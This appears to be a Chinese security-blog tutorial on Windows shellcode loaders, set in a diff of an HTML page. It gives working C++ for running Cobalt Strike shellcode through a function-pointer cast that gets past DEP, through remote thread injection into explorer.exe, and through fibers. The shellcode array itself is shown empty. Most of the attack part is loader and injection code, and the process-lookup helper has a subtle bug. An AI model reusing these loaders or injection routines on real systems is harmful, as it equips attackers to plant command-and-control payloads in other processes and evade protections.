@@ -1,0 +1,284 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="04086532c17818632d4184522a52d8f2">shellcode执行</h2>
+<p>之前聊了聊shellcode的基础，windows与linux原理相同，方便起见直接使用cs生成</p>
+<h3 data-content="1" id="f1e7415042ac8d89cc820d991585c3a7">指针执行</h3>
+<p>将shellcode存储与数组，并取数组地址，将地址转换为<code>void</code>无参数函数指针，并去执行，代码如下</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+
+<span class="c1">// 指定链接器选项，修改.data段为可读、可写、可执行</span>
+<span class="cp">#pragma comment(linker, "/section:.data,RWE")</span>
+
+<span class="c1">// shellcode</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">hexData</span><span class="p">[</span><span class="mi">990</span><span class="p">]</span> <span class="o">=</span>
+<span class="p">{</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// 将hexData转换为函数指针并执行</span>
+    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">hexData</span><span class="p">)();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>这也是网上很多shellcodeloader教程给出的第一个最基础的loader ，但其实是有问题的，当代的windows都有一个叫做DEP数据执行保护的安全机制，在编写此类的loader时需要手动修改他，可以使用<code>VirtualProtect</code></p>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>
+  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>          <span class="c1">// 指向要修改的内存区域的起始地址</span>
+  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>             <span class="c1">// 需要修改的内存区域大小，以字节为单位</span>
+  <span class="n">DWORD</span> <span class="n">flNewProtect</span><span class="p">,</span>        <span class="c1">// 新的保护属性（如只读、读写、可执行等）</span>
+  <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>      <span class="c1">// 保存旧的保护属性的指针</span>
+<span class="p">);</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">hexData</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hexData</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="c1">// 将hexData转换为函数指针并执行</span>
+    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">hexData</span><span class="p">)();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241015113925-12df289a-8aa7-1.png"/></p>
+<h3 data-content="1" id="02379f761c16c2260b033758c1e6bc4e">远程线程注入</h3>
+<p>简单理解，在已存在的进程中创建一个空间运行注入shellcode的内存空间</p>
+<p>大体上可以分为两步，获得进程的id，写入线程shell</p>
+<h4 data-content="1" id="5b5fe564d1a9a21b7b00f5db8363dbab">CreateToolhelp32Snapshot</h4>
+<p>函数原型：</p>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateToolhelp32Snapshot</span><span class="p">(</span>
+  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="cm">/*这个参数指定了要创建的快照类型*/</span>
+<span class="cm">/*允许以下值</span>
+<span class="cm">TH32CS_SNAPALL：创建一个包含所有进程、线程、堆和模块的快照。</span>
+<span class="cm">TH32CS_SNAPPROCESS：创建一个只包含进程的快照。</span>
+<span class="cm">TH32CS_SNAPTHREAD：创建一个只包含线程的快照。</span>
+<span class="cm">TH32CS_SNAPHEAPLIST：创建一个只包含指定进程的堆的快照。</span>
+<span class="cm">TH32CS_SNAPMODULE：创建一个只包含指定进程的模块的快照。</span>
+<span class="cm">TH32CS_INHERIT：快照句柄可以被子进程继承。*/</span>
+  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">th32ProcessID</span> <span class="cm">/*指定要快照的进程的ID*/</span>
+<span class="p">);</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="nf">findProessId</span><span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">targetProessName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// 拉取进程镜像</span>
+    <span class="n">HANDLE</span> <span class="n">hShot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//创建一个只包含进程的快照。</span>
+
+    <span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
+    <span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pe</span><span class="p">);</span>
+
+    <span class="c1">//遍历</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hShot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 获取第一条</span>
+        <span class="k">do</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span><span class="n">targetProessName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span> <span class="c1">//比较可执行文件名</span>
+                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hShot</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ParentProcessID</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hShot</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span><span class="c1">//获取下一条，如果没有跳出循环</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<h4 data-content="1" id="169f7ce712176e69ab23943f67cc4c86">OpenProcess</h4>
+<p>WindowsApi的函数，用于打开一个已经存在的进程，并返回一个可供操作的句柄</p>
+<p>函数原型：</p>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span> <span class="nf">OpenProcess</span><span class="p">(</span>
+  <span class="n">DWORD</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="c1">//希望获得的访问权限，可以多个组合</span>
+  <span class="n">BOOL</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="c1">//如果指定为true，则任何又这个进程创建的子进程都将继承句柄false则不继承</span>
+  <span class="n">DWORD</span> <span class="n">dwProcessId</span> <span class="c1">//指定要打开进程的pid</span>
+<span class="p">);</span>
+</pre></div>
+<h4 data-content="1" id="10f652ed92b6b98b1b675e5c59fa057f">VirtualAllocEx</h4>
+<p>VirtualAllocEx函数用于在进程的虚拟地址空间中修改内存状态，这里用它来分配内存，函数原型是这样的</p>
+<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span>
+  <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="c1">//前一个openprocess获得的句柄</span>
+  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="c1">//要分配的内存区域基址，可以为NULL</span>
+  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="c1">//大小</span>
+  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span> <span class="c1">//内存分配类型</span>
+  <span class="n">DWORD</span>  <span class="n">flProtect</span> <span class="c1">//内存区域访问保护类型</span>
+<span class="p">);</span>
+</pre></div>
+<p>参数说明：</p>
+<ul>
+<li>
+<p><code>hProcess</code>：指定进程的句柄。这个句柄必须拥有 <code>PROCESS_VM_OPERATION</code> 的访问权限。</p>
+</li>
+<li>
+<p><code>lpAddress</code>：指定要分配的内存区域的基址。如果此值为 <code>NULL</code>，则系统会为内存区域选择一个基址。</p>
+</li>
+<li>
+<p><code>dwSize</code>：指定要分配的内存区域的大小（字节为单位）。大小必须为页面大小的整数倍。</p>
+</li>
+<li>
+<pre><code>flAllocationType</code></pre>
+<p>：指定内存分配类型，可以是以下值的组合：</p>
+<ul>
+<li>
+<code>MEM_COMMIT</code>：提交内存区域，使其成为调用进程的可访问内存。</li>
+<li>
+<code>MEM_RESERVE</code>：保留内存区域，为其保留虚拟地址空间，但不分配物理存储。</li>
+<li>
+<code>MEM_RESET</code>：指示在内存中由 <code>lpAddress</code> 和 <code>dwSize</code> 参数指定的数据无效。</li>
+<li>
+<code>MEM_TOP_DOWN</code>：在尽可能高的地址上分配内存。</li>
+<li>
+<code>MEM_WRITE_WATCH</code>：必须与 <code>MEM_RESERVE</code> 一起指定，使系统跟踪那些被写入分配区域的页面。</li>
+<li>
+<code>MEM_PHYSICAL</code>：分配物理内存（仅用于地址窗口扩展内存）。</li>
+</ul>
+</li>
+<li>
+<pre><code>flProtect</code></pre>
+<p>：指定内存区域的访问保护类型，可以是以下值的组合：</p>
+<ul>
+<li>
+<code>PAGE_EXECUTE</code>：可执行。</li>
+<li>
+<code>PAGE_EXECUTE_READ</code>：可读可执行。</li>
+<li>
+<code>PAGE_EXECUTE_READWRITE</code>：可读写可执行。</li>
+<li>
+<code>PAGE_EXECUTE_WRITECOPY</code>：可读写可执行（写时复制）。</li>
+<li>
+<code>PAGE_NOACCESS</code>：不可访问。</li>
+<li>
+<code>PAGE_READONLY</code>：只读。</li>
+<li>
+<code>PAGE_READWRITE</code>：可读写。</li>
+<li>
+<code>PAGE_WRITECOPY</code>：可读写（写时复制）。</li>
+</ul>
+</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>如果函数成功，则返回值是页面分配区域的基址。</li>
+<li>如果函数失败，则返回值是 <code>NULL</code>。要获取扩展的错误信息调用 <code>GetLastError</code>。</li>
+</ul>
+<h4 data-content="1" id="9d1ca794abead5a6d7f1ec4dc6dfe7e9">WriteProcessMemory</h4>
+<p>WriteProcessMemory函数，其作用是将数据写入另一进程的内存空间的函数</p>
+<p>函数原型</p>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span>
+  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span> <span class="c1">//句柄</span>
+  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="c1">//基址</span>
+  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="c1">//源缓冲区指针</span>
+  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span> <span class="c1">//要写入的大小（字节单位）</span>
+  <span class="n">SIZE_T</span> <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span> <span class="c1">//指针，用于接受实际写入的字节数</span>
+<span class="p">);</span>
+</pre></div>
+<p>如果函数成功返回非零，反之为零</p>
+<h4 data-content="1" id="afc3b665f1a90df96ed29ed6cc206a25">CreateRemoteThread</h4>
+<p>CreateRemoteThread函数，用于在另一进程的虚拟地址空间创建一个线程</p>
+<p>函数原型：</p>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
+  <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="c1">//句柄</span>
+  <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="c1">// 安全属性 可以是NULL</span>
+  <span class="n">SIZE_T</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="c1">//线程栈的大小 如果是0则使用可执行文件的预设大小</span>
+  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="c1">//指向线程的函数的指针</span>
+  <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="c1">//传递给线程函数的参数</span>
+  <span class="n">DWORD</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="c1">//控制线程创建标志</span>
+  <span class="n">LPDWORD</span> <span class="n">lpThreadId</span> <span class="c1">//指向接收线程标识符的变量</span>
+<span class="p">);</span>
+</pre></div>
+<p>返回值：</p>
+<ul>
+<li>如果函数成功，返回值是新线程的句柄。</li>
+<li>如果函数失败，返回值为 <code>NULL</code>。</li>
+</ul>
+<h4 data-content="1" id="09b6dc82c8763e62d646b0f5583287bb">具体代码</h4>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span> <span class="n">openPr</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">proessId</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">openPr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="n">proessId</span> <span class="o">&lt;&lt;</span> <span class="s">"打开进程失败"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//在虚拟地址中分配内存</span>
+    <span class="n">LPVOID</span> <span class="n">mec</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span> <span class="c1">// 大小shellcode决定 权限分配 可访问内存 保留内存区域 可读可写可执行</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mec</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"内存分配失败"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//写入目标</span>
+    <span class="n">SIZE_T</span> <span class="n">bytes</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span><span class="n">mec</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="o">&amp;</span><span class="n">bytes</span><span class="p">)</span> <span class="o">||</span> <span class="n">bytes</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)){</span> <span class="c1">// 写入内存</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"写入失败"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+    <span class="p">}</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">mec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"创建线程失败"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+<p><img src="https://s2.loli.net/2024/10/10/MeiQw7uxsrdIjO1.png"/></p>
+<p>如果都正确，最终效果应该是这样的，注入成功后上线自动退出</p>
+<p>精简后核心代码其实就是这几条</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">targetProcessName</span> <span class="o">=</span> <span class="sa">L</span><span class="s">"explorer.exe"</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">proessId</span> <span class="o">=</span> <span class="n">findProessId</span><span class="p">(</span><span class="n">targetProcessName</span><span class="p">);</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">proessId</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">openPr</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">proessId</span><span class="p">);</span>
+    <span class="n">LPVOID</span> <span class="n">mec</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span> <span class="c1">// 大小shellcode决定 权限分配 可访问内存 保留内存区域 可读可写可执行</span>
+    <span class="n">SIZE_T</span> <span class="n">bytes</span><span class="p">;</span>
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span> <span class="n">mec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytes</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">openPr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">mec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+<h3 data-content="1" id="359929866587afdb91fc51923b7769ba">纤程执行</h3>
+<p>之前完全没接触过的名词，根据wiki与gpt的解释是纤程是用户级的轻量级并发单元，与线程不同不依赖操作系统进行调度，由应用程序管理</p>
+<p>核心代码是</p>
+<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">;</span>
+  <span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+
+  <span class="c1">// 将当前线程转换为纤程（轻量级线程）</span>
+  <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="c1">// 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span>
+  <span class="kt">void</span><span class="o">*</span> <span class="n">shellcodeFiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="c1">// 切换到新创建的纤程，开始执行shellcode</span>
+  <span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcodeFiber</span><span class="p">);</span>
+
+  <span class="c1">// shellcode执行完毕后，删除纤程对象</span>
+  <span class="n">DeleteFiber</span><span class="p">(</span><span class="n">shellcodeFiber</span><span class="p">);</span>
+</pre></div>
+<p>其中会用到五个函数，VirtualProtect就略过了</p>
+<h4 data-content="1" id="fcb564bf96358ab0b4d45d9134a6f512">ConvertThreadToFiber</h4>
+<p>ConvertThreadToFiber 函数的作用是将当前的线程转化为纤程，当他执行的时就直接转换了</p>
+<p>函数原型：</p>
+<div class="highlight"><pre><span></span><span class="n">PVOID</span> <span class="nf">ConvertThreadToFiber</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pFiber</span><span class="p">);</span> <span class="c1">// 传入NULL就是将当前线程进行转化</span>
+</pre></div>
+<h4 data-content="1" id="5d21c7cd8695bcdd30513f69839e77ea">CreateFiber</h4>
+<p>CreateFiber函数作用是允许手动创建纤程</p>
+<p>函数原型:</p>
+<div class="highlight"><pre><span></span><span class="n">PVOID</span> <span class="nf">CreateFiber</span><span class="p">(</span>
+  <span class="n">SIZE_T</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="c1">//纤程栈大小</span>
+  <span class="n">LPFIBER_START_ROUTINE</span> <span class="n">pFiberProc</span><span class="p">,</span> <span class="c1">//指向函数的指针</span>
+  <span class="n">PVOID</span> <span class="n">pParameter</span> <span class="c1">//参数指针</span>
+<span class="p">);</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241015113954-24988c70-8aa7-1.png"/></p>
+<blockquote>
+<p>参考文献</p>
+<ol>
+<li>
+<p>指针执行</p>
+<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/memory/data-execution-prevention" target="_blank">https://learn.microsoft.com/zh-cn/windows/win32/memory/data-execution-prevention</a></p>
+<p><a href="https://xz.aliyun.com/t/13855" target="_blank">https://xz.aliyun.com/t/13855</a></p>
+</li>
+<li>
+<p>远程线程注入</p>
+<p><a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank">https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</a></p>
+<p><a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank">https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></p>
+<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank">https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></p>
+<p><a href="https://www.cnblogs.com/lfls128/p/4929766.html" target="_blank">https://www.cnblogs.com/lfls128/p/4929766.html</a></p>
+<p><a href="https://blog.csdn.net/swartz_lubel/article/details/80295997" target="_blank">https://blog.csdn.net/swartz_lubel/article/details/80295997</a></p>
+</li>
+<li>
+<p>纤程执行</p>
+<p><a href="https://en.wikipedia.org/wiki/Fiber_(computer_science" target="_blank">https://en.wikipedia.org/wiki/Fiber_(computer_science</a>)</p>
+<p><a href="https://www.henry-blog.life/henry-blog/shellcode-jia-zai-qi/chuang-jian-xian-cheng-jia-zai" target="_blank">https://www.henry-blog.life/henry-blog/shellcode-jia-zai-qi/chuang-jian-xian-cheng-jia-zai</a></p>
+</li>
+</ol>
+</blockquote>
+</div>
+</div>
